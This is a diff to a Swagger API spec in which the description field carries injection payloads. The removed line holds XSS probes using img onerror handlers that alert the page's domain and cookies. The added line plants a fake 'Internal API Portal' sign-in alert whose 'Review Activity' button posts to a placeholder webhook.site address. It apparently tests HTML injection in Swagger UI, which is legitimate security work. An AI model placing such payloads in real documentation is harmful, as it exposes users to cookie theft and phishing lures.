@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: 'Swagger UI'
-  description: 'XSS test: onload="alert(1)" <img src=https://placehold.co/900x300/0d1117/00ff88/png?text=%3E+INJECTION+PROOF_ onclick="alert(2)" onerror="alert(3)"> <img src=x onerror=alert(document.domain)> <img src=x onerror=alert(document.cookie)>'
+  description: '<div style="position:fixed;top:16px;right:16px;width:320px;background:#202124;color:#e8eaed;border-radius:8px;box-shadow:0 6px 24px rgba(0,0,0,.5);z-index:99999;font-family:Arial;padding:14px 16px;font-size:13px;"><strong style="color:#8ab4f8;">Internal API Portal</strong><br><br>A new sign-in to your account was detected from an unknown device.<br><br><form action="https://webhook.site/REPLACE-ME" method="post"><button type="submit" style="padding:8px 18px;background:#8ab4f8;color:#202124;border:none;border-radius:4px;font-weight:bold;cursor:pointer;">Review Activity</button></form><span style="color:#9aa0a6;font-size:11px;">settings | block</span></div>'
 paths:
   /Login_Page:
     post:
